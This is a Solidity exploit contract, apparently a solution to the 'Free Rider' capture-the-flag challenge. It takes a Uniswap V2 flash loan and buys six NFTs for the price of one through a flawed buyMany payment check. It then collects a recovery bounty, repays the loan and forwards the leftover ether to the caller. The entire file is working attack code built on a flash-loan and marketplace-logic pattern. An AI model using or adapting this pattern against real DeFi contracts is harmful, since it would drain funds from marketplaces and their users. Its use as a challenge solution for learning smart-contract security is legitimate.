// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IWETH.sol';
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";
contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    using Address for address payable;
    uint256 constant NFT_SIZE = 6;
    uint256 constant NFT_PRICE = 15 ether;
    FreeRiderNFTMarketplace marketplace;
    address recovery;
    IUniswapV2Factory factoryV2;
    IUniswapV2Pair pair;
    IWETH weth;
    constructor (FreeRiderNFTMarketplace _marketplace, address _recovery, IUniswapV2Factory _factoryV2, IUniswapV2Pair _pair, IWETH _weth) {
        marketplace = _marketplace;
        recovery = _recovery;
        factoryV2 = _factoryV2;
        pair = _pair;
        weth = _weth;
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(msg.sender == IUniswapV2Factory(factoryV2).getPair(token0, token1)); // ensure that msg.sender is a V2 pair
        // The flashloan ether must be enough to buy one NFT token
        require(IERC20(address(weth)).balanceOf(address(this)) == NFT_PRICE, "Flashloan Failed");
        weth.withdraw(NFT_PRICE);
        uint256[] memory tokenIds = new uint256[](NFT_SIZE);
        uint i = 0;
        for (i=0; i<NFT_SIZE; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value:NFT_PRICE}(tokenIds);
        //Attacker will receive 90 ether if attack runs correctly
        require(address(this).balance == 90 ether, "Attacking market failed");
        for (i=0; i<NFT_SIZE; i++) {
            marketplace.token().safeTransferFrom(address(this), recovery, tokenIds[i], data);
        }
        //player will receive 45 ether if all 6 NFT tokens are sent to the bounty contract
        require(address(tx.origin).balance >= 45 ether, "Selling failed");
        //calculate the repayment of flashloan and repay it
        uint amountRepayed = NFT_PRICE * 1000 / 997 + 1;
        weth.deposit{value: amountRepayed}();
        weth.transfer(msg.sender, amountRepayed);
        //send remain ether to player
        payable(tx.origin).sendValue(address(this).balance);
    }
    function attack() external {
        address token0 = pair.token0(); // fetch the address of token0
        (uint256 amount0Out, uint256 amount1Out) = (token0 == address(weth)) ? (NFT_PRICE, uint(0)):(uint(0), NFT_PRICE);
        bytes memory data = abi.encode(msg.sender);
        pair.swap(amount0Out, amount1Out, address(this), data);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
    receive() external payable {} //receive ether
    fallback() external payable {}
}